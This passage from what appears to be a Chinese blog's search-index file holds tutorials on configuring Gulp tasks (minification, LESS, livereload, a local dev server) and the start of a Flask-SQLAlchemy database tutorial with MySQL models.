class="built_in">require</span>(<span class="string">&#x27;gulp-uglify&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> rename = <span class="built_in">require</span>(<span class="string">&#x27;gulp-rename&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>注册任务</li></ol><p>在引入插件之后我们便可以执行链式调用来配置任务了，每一个操作用 <code>pipe</code> 方法来进行连接：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/js/*.js&#x27;</span>)</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">concat</span>(<span class="string">&#x27;build.js&#x27;</span>)) <span class="comment">// 临时合并文件</span></span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/js/&#x27;</span>)) <span class="comment">// 临时输出文件到本地</span></span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">uglify</span>())</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">rename</span>(&#123; <span class="attr">suffix</span>: <span class="string">&#x27;.min&#x27;</span> &#125;)) <span class="comment">// 重命名</span></span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/js/&#x27;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="6-3-执行任务"><a href="#6-3-执行任务" class="headerlink" title="6.3 执行任务"></a>6.3 执行任务</h2><p>调用已注册的任务，我们可以得到一个已经合并的文件 <code>build.js</code> 和一个合并并压缩的文件 <code>build.min.js</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp js</span><br></pre></td></tr></table></figure><blockquote><p>gulp会自动忽略为调用的函数方法</p></blockquote><h1 id="7-合并压缩css任务"><a href="#7-合并压缩css任务" class="headerlink" title="7. 合并压缩css任务"></a>7. 合并压缩css任务</h1><ol><li>下载插件</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-less gulp-clean-css --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>引入和使用插件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> concat = <span class="built_in">require</span>(<span class="string">&#x27;gulp-concat&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> rename = <span class="built_in">require</span>(<span class="string">&#x27;gulp-rename&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> less = <span class="built_in">require</span>(<span class="string">&#x27;gulp-less&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cssClean = <span class="built_in">require</span>(<span class="string">&#x27;gulp-clean-css&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册转换less的任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;less&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/less/*.less&#x27;</span>)</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">less</span>()) <span class="comment">// 编译less文件为css文件</span></span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;src/css&#x27;</span>)) <span class="comment">// 将less编译为css文件后存放到css文件夹中，等待后续统一合并</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并压缩css文件</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;css&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/css/*.css&#x27;</span>)</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">concat</span>(<span class="string">&#x27;build.css&#x27;</span>))</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">rename</span>(&#123; <span class="attr">suffix</span>: <span class="string">&#x27;.min&#x27;</span> &#125;))</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">cssClean</span>(&#123; <span class="attr">compatibility</span>: <span class="string">&#x27;ie8&#x27;</span> &#125;)) <span class="comment">// 压缩、设置兼容到ie8</span></span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/css/&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;default&#x27;</span>, [])</span><br></pre></td></tr></table></figure><ol start="3"><li>执行任务</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; gulp less</span><br><span class="line">[15:18:39] Using gulpfile D:\<span class="built_in">test</span>\gulp_study\gulpfile.js</span><br><span class="line">[15:18:39] Starting <span class="string">&#x27;less&#x27;</span>...</span><br><span class="line">[15:18:39] Finished <span class="string">&#x27;less&#x27;</span> after 43 ms</span><br><span class="line"></span><br><span class="line">&gt; gulp css</span><br><span class="line">[15:18:46] Using gulpfile D:\<span class="built_in">test</span>\gulp_study\gulpfile.js</span><br><span class="line">[15:18:46] Starting <span class="string">&#x27;css&#x27;</span>...</span><br><span class="line">[15:18:46] Finished <span class="string">&#x27;css&#x27;</span> after 48 ms</span><br></pre></td></tr></table></figure><h1 id="8-线性执行任务"><a href="#8-线性执行任务" class="headerlink" title="8. 线性执行任务"></a>8. 线性执行任务</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line">... ...</span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;default&#x27;</span>, [<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;less&#x27;</span>, <span class="string">&#x27;css&#x27;</span>])</span><br></pre></td></tr></table></figure><p>在用这种方式时，gulp的每个编译任务是移异步进行的，如果将编写任务中的 <code>return</code> 去掉，则编译过程是同步进行的，如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  gulp.task(&#x27;js&#x27;, function () &#123;</span><br><span class="line"><span class="deletion">-   return gulp.src(&#x27;src/js/*.js&#x27;)</span></span><br><span class="line"><span class="addition">+   gulp.src(&#x27;src/js/*.js&#x27;)</span></span><br><span class="line">      .pipe(concat(&#x27;build.js&#x27;)) // 临时合并文件</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;)) // 临时输出文件到本地</span><br><span class="line">      .pipe(uglify())</span><br><span class="line">      .pipe(rename(&#123; suffix: &#x27;.min&#x27; &#125;)) // 重命名</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;))</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><blockquote><p>但是我们不推荐这么做（占内存，速度慢）</p></blockquote><p>当我们需要逐个执行任务的时候，可以在设置任务的第二个参数位置，去设置它的依赖任务，如我们如果需要设置先执行 <code>less</code> 任务，再执行 <code>css</code> 任务，那么 <code>css</code> 任务的依赖任务就是 <code>less</code> 任务，我们可以进行如下设置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;css&#x27;</span>, [<span class="string">&#x27;less&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/css/*.css&#x27;</span>)</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="9-html压缩"><a href="#9-html压缩" class="headerlink" title="9. html压缩"></a>9. html压缩</h1><ol><li>下载插件</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-html --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>引入和使用插件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glupfile.js</span></span><br><span class="line"><span class="keyword">var</span> htmlMin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-html&#x27;</span>)</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册压缩html的任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;html&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    .<span class="title function_">pipe</span>(<span class="title function_">htmlMin</span>(&#123; <span class="attr">collapseWhitespace</span>: <span class="literal">true</span> &#125;)) <span class="comment">// 压缩html</span></span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/&#x27;</span>)) <span class="comment">// 输出</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>执行任务</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp html</span><br></pre></td></tr></table></figure><blockquote><p>注意路径问题，压缩输出的 html 换到了另外的一个路径下，这个所以导出 html 前，必须将路径配置到 <code>dist</code> 目录下。</p></blockquote><h1 id="10-半自动进行项目构建"><a href="#10-半自动进行项目构建" class="headerlink" title="10. 半自动进行项目构建"></a>10. 半自动进行项目构建</h1><ol><li>下载插件</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-livereload --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>配置编码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监视任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;watch&#x27;</span>, [<span class="string">&#x27;default&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 开启监听</span></span><br><span class="line">  livereload.<span class="title function_">listen</span>();</span><br><span class="line">  <span class="comment">// 确认监听的目标以及绑定相应的任务</span></span><br><span class="line">  gulp.<span class="title function_">watch</span>(<span class="string">&#x27;src/js/*.js&#x27;</span>, [<span class="string">&#x27;js&#x27;</span>]);</span><br><span class="line">  gulp.<span class="title function_">watch</span>([<span class="string">&#x27;src/css/*.css&#x27;</span>, <span class="string">&#x27;src/less/*.less&#x27;</span>], [<span class="string">&#x27;css&#x27;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在设置完监听任务后，需要在监听的任务中再额外增加一个 <code>pipe(livereload())</code> 方法，如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  gulp.task(&#x27;js&#x27;, function () &#123;</span><br><span class="line">    return gulp.src(&#x27;src/js/*.js&#x27;)</span><br><span class="line">      .pipe(concat(&#x27;build.js&#x27;)) // 临时合并文件</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;)) // 临时输出文件到本地</span><br><span class="line">      .pipe(uglify())</span><br><span class="line">      .pipe(rename(&#123; suffix: &#x27;.min&#x27; &#125;)) // 重命名</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;))</span><br><span class="line"><span class="addition">+     .pipe(livereload())</span></span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>执行任务</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp watch</span><br></pre></td></tr></table></figure><p>之后当我们编辑监听中的代码时，就可以自动打包编译，之后再<strong>手动刷新</strong>浏览器后就可以浏览效果，如果想要<strong>自动刷新</strong>看下一节全自动构建项目。</p><h1 id="11-全自动构建项目"><a href="#11-全自动构建项目" class="headerlink" title="11. 全自动构建项目"></a>11. 全自动构建项目</h1><ol><li>安装插件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-connect --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>引入并使用插件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> connect = <span class="built_in">require</span>(<span class="string">&#x27;gulp-connect&#x27;</span>)</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="comment">// 注册监视任务（全自动）</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;server&#x27;</span>, [<span class="string">&#x27;default&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 配置服务器选项</span></span><br><span class="line">  connect.<span class="title function_">server</span>(&#123;</span><br><span class="line">    <span class="attr">root</span>: <span class="string">&#x27;dist/&#x27;</span>,</span><br><span class="line">    <span class="attr">livereload</span>: <span class="literal">true</span>, <span class="comment">// 实时刷新</span></span><br><span class="line">    <span class="attr">port</span>: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 确认监听的目标以及绑定相应的任务</span></span><br><span class="line">  gulp.<span class="title function_">watch</span>(<span class="string">&#x27;src/js/*.js&#x27;</span>, [<span class="string">&#x27;js&#x27;</span>]);</span><br><span class="line">  gulp.<span class="title function_">watch</span>([<span class="string">&#x27;src/css/*.css&#x27;</span>, <span class="string">&#x27;src/less/*.less&#x27;</span>], [<span class="string">&#x27;css&#x27;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>相似的，在设置完全自动监听的任务后，需要在监听的任务中再额外增加一个 <code>.pipe(connect.reload())</code> 方法，如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  gulp.task(&#x27;js&#x27;, function () &#123;</span><br><span class="line">    return gulp.src(&#x27;src/js/*.js&#x27;)</span><br><span class="line">      .pipe(concat(&#x27;build.js&#x27;)) // 临时合并文件</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;)) // 临时输出文件到本地</span><br><span class="line">      .pipe(uglify())</span><br><span class="line">      .pipe(rename(&#123; suffix: &#x27;.min&#x27; &#125;)) // 重命名</span><br><span class="line">      .pipe(gulp.dest(&#x27;dist/js/&#x27;))</span><br><span class="line"><span class="addition">+     .pipe(connect.reload())</span></span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>执行任务</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gulp server</span><br></pre></td></tr></table></figure><h2 id="12-扩展"><a href="#12-扩展" class="headerlink" title="12. 扩展"></a>12. 扩展</h2><h3 id="12-1-使用-open-模块自动打开浏览器"><a href="#12-1-使用-open-模块自动打开浏览器" class="headerlink" title="12.1 使用 open 模块自动打开浏览器"></a>12.1 使用 open 模块自动打开浏览器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install open --save-dev</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> open = <span class="built_in">require</span>(<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册监视任务（全自动）</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;server&#x27;</span>, [<span class="string">&#x27;default&#x27;</span>], <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="title function_">open</span>(<span class="string">&#x27;http://localhost:5000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="12-2-使用-gulp-load-plugins-插件"><a href="#12-2-使用-gulp-load-plugins-插件" class="headerlink" title="12.2 使用 gulp-load-plugins 插件"></a>12.2 使用 gulp-load-plugins 插件</h2><ol><li>下载：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install gulp-load-plugins --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>引入：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;gulp-load-plugins&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>之后我们便可以直接使用 <code>$</code> 对象来调用所有的插件方法：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>)</span><br><span class="line"><span class="comment">// var concat = require(&#x27;gulp-concat&#x27;)</span></span><br><span class="line"><span class="comment">// var uglify = require(&#x27;gulp-uglify&#x27;)</span></span><br><span class="line"><span class="comment">// var rename = require(&#x27;gulp-rename&#x27;)</span></span><br><span class="line"><span class="comment">// var less = require(&#x27;gulp-less&#x27;)</span></span><br><span class="line"><span class="comment">// var cssClean = require(&#x27;gulp-clean-css&#x27;)</span></span><br><span class="line"><span class="comment">// var htmlMin = require(&#x27;gulp-htmlmin&#x27;)</span></span><br><span class="line"><span class="comment">// var livereload = require(&#x27;gulp-livereload&#x27;)</span></span><br><span class="line"><span class="comment">// var connect = require(&#x27;gulp-connect&#x27;)</span></span><br><span class="line"><span class="comment">// var open = require(&#x27;open&#x27;)</span></span><br><span class="line"><span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;gulp-load-plugins&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册压缩html的任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/js/*.js&#x27;</span>)</span><br><span class="line">    .<span class="title function_">pipe</span>($.<span class="title function_">concat</span>(<span class="string">&#x27;build.js&#x27;</span>)) <span class="comment">// 临时合并文件</span></span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/js/&#x27;</span>)) <span class="comment">// 临时输出文件到本地</span></span><br><span class="line">    .<span class="title function_">pipe</span>($.<span class="title function_">uglify</span>())</span><br><span class="line">    .<span class="title function_">pipe</span>($.<span class="title function_">rename</span>(&#123; <span class="attr">suffix</span>: <span class="string">&#x27;.min&#x27;</span> &#125;)) <span class="comment">// 重命名</span></span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist/js/&#x27;</span>))</span><br><span class="line">    .<span class="title function_">pipe</span>($.<span class="title function_">livereload</span>())</span><br><span class="line">    .<span class="title function_">pipe</span>($.connect.<span class="title function_">reload</span>())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="4"><li>命名规则：</li></ol><p>使用 <code>$</code> 对象引入的 gulp 插件必须有其对应的命名方法，其规则为：</p><ul><li>忽略连接符前的 gulp，直接写插件名称，如：<code>gulp-concat</code> 插件对应的引入方法为 <code>$.concat</code></li><li>如果有多个连接符，则采用驼峰命名，如：<code>gulp-clean-css</code> 插件对应的引入方法为 <code>$.cleanCss</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> Gulp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Flask-Sqlachemy操作数据库对象</title>
      <link href="/2019/07/6614739b123e.html"/>
      <url>/2019/07/6614739b123e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Hello-Flask"><a href="#1-Hello-Flask" class="headerlink" title="1. Hello Flask"></a>1. Hello Flask</h1><p>快速开始示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;get&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-使用数据库"><a href="#2-使用数据库" class="headerlink" title="2. 使用数据库"></a>2. 使用数据库</h1><h2 id="2-1-使用flask-sqlalchemy连接和创建数据库内容"><a href="#2-1-使用flask-sqlalchemy连接和创建数据库内容" class="headerlink" title="2.1 使用flask_sqlalchemy连接和创建数据库内容"></a>2.1 使用flask_sqlalchemy连接和创建数据库内容</h2><p><a href="https://blog.csdn.net/feilzhang/article/details/81041637">笔记：flask数据库之Flask-SQLAlchemy安装及配置</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;mysql://root:@localhost/flask_study&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库模型，需要继承db.Model</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Role</span>(db.Model):</span><br><span class="line">    <span class="comment">#    定义表名</span></span><br><span class="line">    __tablename__ = <span class="string">&quot;roles&quot;</span></span><br><span class="line">    <span class="comment">#     定义字段</span></span><br><span class="line">    <span class="comment">#     db.Column表示一个字段</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">16</span>), unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">16</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># db.ForeignKey标识外键</span></span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;roles.id&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello flask!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 删除表</span></span><br><span class="line">    db.drop_all()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建表</span></span><br><span class="line">    db.create_all()</span><br><span class="line"></span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2-在shell中使用ipython修改数据"><a href="#2-2-在shell中使用ipython修改数据" class="headerlink" title="2.2 在shell中使用ipython修改数据"></a>2.2 在shell中使用ipython修改数据</h2><p><a 